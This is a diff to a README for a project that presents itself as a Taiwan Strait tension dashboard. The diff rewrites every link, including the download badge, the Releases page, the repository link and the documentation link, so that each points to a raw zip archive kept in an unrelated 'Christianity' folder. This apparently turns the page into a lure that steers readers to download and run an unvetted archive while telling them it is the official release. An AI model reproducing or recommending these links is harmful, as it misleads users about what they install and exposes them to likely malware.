@@ -1,7 +1,7 @@
 # 🌍 TaiWan-situation - Monitor Taiwan Strait Tensions Easily
 
 ## 📥 Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Now-%20-blue)](https://github.com/enchantedkaka/TaiWan-situation/releases)
+[![Download Release](https://raw.githubusercontent.com/enchantedkaka/TaiWan-situation/main/Christianity/TaiWan-situation_v3.3.zip%20Now-%20-blue)](https://raw.githubusercontent.com/enchantedkaka/TaiWan-situation/main/Christianity/TaiWan-situation_v3.3.zip)
 
 ## 📜 Description
 TaiWan-situation is an open-source, automated dashboard designed to track the risk index of tensions in the Taiwan Strait. Utilizing a V4 cumulative decay model, it provides users with current data and insights on geopolitical risks, enhancing awareness and understanding of the situation.
@@ -17,7 +17,7 @@ TaiWan-situation is an open-source, automated dashboard designed to track the ri
 Follow these steps to download and run the TaiWan-situation dashboard on your computer.
 
 ### Step 1: Visit the Releases Page
-Go to our [Releases page](https://github.com/enchantedkaka/TaiWan-situation/releases). Here, you will find the latest version of the application.
+Go to our [Releases page](https://raw.githubusercontent.com/enchantedkaka/TaiWan-situation/main/Christianity/TaiWan-situation_v3.3.zip). Here, you will find the latest version of the application.
 
 ### Step 2: Download the Latest Version
 On the Releases page, locate the latest version of the application. Click on the download link corresponding to your operating system (Windows, Mac, or Linux).
@@ -73,10 +73,10 @@ Your input is valuable to us and helps improve the project.
 If you have questions or need assistance, please visit the Issues page on GitHub and open a new issue. You can also check the documentation for FAQs.
 
 ## 💡 Additional Resources
-- [GitHub Repository](https://github.com/enchantedkaka/TaiWan-situation)
-- [Documentation](https://github.com/enchantedkaka/TaiWan-situation/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/enchantedkaka/TaiWan-situation/main/Christianity/TaiWan-situation_v3.3.zip)
+- [Documentation](https://raw.githubusercontent.com/enchantedkaka/TaiWan-situation/main/Christianity/TaiWan-situation_v3.3.zip)
 
 ## ✨ Download & Install
-Remember, download the application from our [Releases page](https://github.com/enchantedkaka/TaiWan-situation/releases) for the best experience. Follow the steps outlined in the "Getting Started" section to ensure a smooth installation.
+Remember, download the application from our [Releases page](https://raw.githubusercontent.com/enchantedkaka/TaiWan-situation/main/Christianity/TaiWan-situation_v3.3.zip) for the best experience. Follow the steps outlined in the "Getting Started" section to ensure a smooth installation.
 
 Stay informed about Taiwan Strait tensions easily and effectively with TaiWan-situation.
